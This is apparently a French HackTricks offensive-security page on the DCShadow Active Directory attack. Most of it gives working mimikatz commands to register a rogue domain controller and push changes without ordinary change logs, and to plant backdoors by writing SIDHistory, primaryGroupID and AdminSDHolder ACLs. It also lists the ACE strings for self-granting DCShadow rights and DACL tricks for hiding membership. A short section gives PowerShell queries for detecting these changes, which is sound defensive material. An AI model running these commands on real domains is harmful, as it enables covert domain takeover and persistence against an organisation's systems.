# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Il enregistre un **nouveau Domain Controller** dans l’AD et l’utilise pour **push des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans laisser de **logs** concernant les **modifications**. Vous **devez disposer des privilèges DA** et être à l’intérieur du **root domain**.\
Notez que si vous utilisez des données incorrectes, des logs particulièrement compromettants apparaîtront.<sup>[[2]](#references)</sup>

Pour effectuer l’attaque, vous avez besoin de 2 instances de mimikatz. L’une d’elles démarrera les serveurs RPC avec les privilèges SYSTEM (vous devez y indiquer les modifications que vous souhaitez effectuer), et l’autre instance sera utilisée pour push les valeurs :
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Notez que **`elevate::token`** ne fonctionnera pas dans la session `mimikatz1`, car cela a élevé les privilèges du thread, alors que nous devons élever le **privilège du processus**.\
Vous pouvez également sélectionner un objet « LDAP » : `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Vous pouvez appliquer les modifications depuis un DA ou depuis un utilisateur disposant de ces permissions minimales :

- Dans l’**objet du domaine** :
- _DS-Install-Replica_ (Ajouter/Supprimer un Replica dans le domaine)
- _DS-Replication-Manage-Topology_ (Gérer la topologie de réplication)
- _DS-Replication-Synchronize_ (Synchronisation de la réplication)
- L’objet **Sites** (et ses enfants) dans le **conteneur Configuration** :
- _CreateChild and DeleteChild_
- L’objet de l’**ordinateur enregistré en tant que DC** :
- _WriteProperty_ (et non Write)
- L’**objet cible** :
- _WriteProperty_ (et non Write)

Vous pouvez utiliser [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) pour accorder ces privilèges à un utilisateur sans privilèges (notez que cela laissera certains logs). Cette méthode est beaucoup plus restrictive que de disposer de privilèges DA.\
Par exemple : `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Cela signifie que le nom d’utilisateur _**student1**_, lorsqu’il est connecté sur la machine _**mcorp-student1**_, dispose des permissions DCShadow sur l’objet _**root1user**_.

## Utiliser DCShadow pour créer des backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abus du groupe principal, lacunes d’énumération et détection

- `primaryGroupID` est un attribut distinct de la liste `member` du groupe. DCShadow/DSInternals peuvent l’écrire directement (par exemple, définir `primaryGroupID=512` pour **Domain Admins**) sans l’application des contrôles LSASS on-box, mais AD **déplace** tout de même l’utilisateur : modifier le PGID supprime toujours l’appartenance à l’ancien groupe principal (même comportement pour tout groupe cible), vous ne pouvez donc pas conserver l’ancienne appartenance au groupe principal.<sup>[[1]](#references)</sup>
- Les outils par défaut empêchent de supprimer un utilisateur de son groupe principal actuel (`ADUC`, `Remove-ADGroupMember`) ; modifier le PGID nécessite donc généralement des écritures directes dans l’annuaire (DCShadow/`Set-ADDBPrimaryGroup`).
- La remontée des appartenances est incohérente :
- **Inclut** les membres dérivés du groupe principal : `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omet** les membres dérivés du groupe principal : `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspectant `member`, `Get-ADUser <user> -Properties memberOf`.
- Les vérifications récursives peuvent ignorer les membres du groupe principal lorsque le **groupe principal est lui-même imbriqué** (par exemple, le PGID de l’utilisateur pointe vers un groupe imbriqué dans Domain Admins) ; `Get-ADGroupMember -Recursive` ou les filtres récursifs LDAP ne renverront pas cet utilisateur, sauf si la récursion résout explicitement les groupes principaux.
- Astuces DACL : les attaquants peuvent **refuser ReadProperty** sur `primaryGroupID` au niveau de l’utilisateur (ou sur l’attribut `member` du groupe pour les groupes qui ne sont pas protégés par AdminSDHolder), masquant ainsi l’appartenance effective à la plupart des requêtes PowerShell ; `net group` continuera toutefois à résoudre l’appartenance. Les groupes protégés par AdminSDHolder réinitialiseront ces refus.

Exemples de détection/surveillance :
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Vérifiez les groupes privilégiés en comparant la sortie de `Get-ADGroupMember` avec `Get-ADGroup -Properties member` ou ADSI Edit afin de détecter les écarts introduits par `primaryGroupID` ou des attributs masqués.<sup>[[1]](#references)</sup>

## Shadowception - Donner les permissions DCShadow à l’aide de DCShadow (sans journaux de permissions modifiés)

Nous devons ajouter les ACE suivants avec le SID de notre utilisateur à la fin :<sup>[[2]](#references)</sup>

- Sur l’objet de domaine :
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sur l’objet ordinateur de l’attaquant : `(A;;WP;;;UserSID)`
- Sur l’objet utilisateur cible : `(A;;WP;;;UserSID)`
- Sur l’objet Sites dans le conteneur Configuration : `(A;CI;CCDC;;;UserSID)`

Pour obtenir l’ACE actuel d’un objet : `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Dans ce cas, vous devez effectuer **plusieurs modifications**, et pas une seule. Dans la **session mimikatz1** (serveur RPC), utilisez le **paramètre `/stack` pour chaque modification**. Vous devez ensuite utiliser **`/push`** une seule fois afin d’appliquer toutes les modifications empilées depuis le serveur rogue.

[**Plus d’informations sur DCShadow sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Aventures liées au comportement, aux rapports et à l’exploitation de Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [Analyse de DCShadow sur ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
